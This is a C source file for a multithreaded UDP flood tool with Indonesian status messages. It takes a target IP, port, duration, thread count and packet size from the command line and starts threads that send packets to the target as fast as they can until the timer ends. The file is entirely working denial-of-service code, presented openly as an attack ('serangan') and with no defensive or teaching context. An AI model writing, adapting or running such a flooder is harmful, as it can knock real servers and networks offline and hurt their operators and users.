#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <time.h>

#define DEFAULT_PACKET_SIZE 512

struct attack_params {
    char ip[64];
    int port;
    int duration;
    int packet_size;
};

int attack_running = 1;

void *flood(void *args) {
    struct attack_params *params = (struct attack_params *)args;

    int sockfd;
    struct sockaddr_in target;
    char *packet = malloc(params->packet_size);
    memset(packet, 'A', params->packet_size);

    sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("Socket error");
        pthread_exit(NULL);
    }

    target.sin_family = AF_INET;
    target.sin_port = htons(params->port);
    target.sin_addr.s_addr = inet_addr(params->ip);

    time_t end = time(NULL) + params->duration;
    int sent = 0;

    while (time(NULL) < end && attack_running) {
        sendto(sockfd, packet, params->packet_size, 0, (struct sockaddr *)&target, sizeof(target));
        sent++;
    }

    close(sockfd);
    printf("Thread selesai. Total paket terkirim: %d\n", sent);
    free(packet);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 6) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS> <PACKET_SIZE>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int packet_size = atoi(argv[5]);

    pthread_t tid[threads];
    struct attack_params params;
    strncpy(params.ip, target_ip, 63);
    params.port = target_port;
    params.duration = duration;
    params.packet_size = packet_size;

    printf("🔥 Memulai serangan UDP ke %s:%d selama %d detik dengan %d thread...\n", target_ip, target_port, duration, threads);

    for (int i = 0; i < threads; i++) {
        pthread_create(&tid[i], NULL, flood, &params);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    printf("✅ Serangan selesai!\n");
    return 0;
}
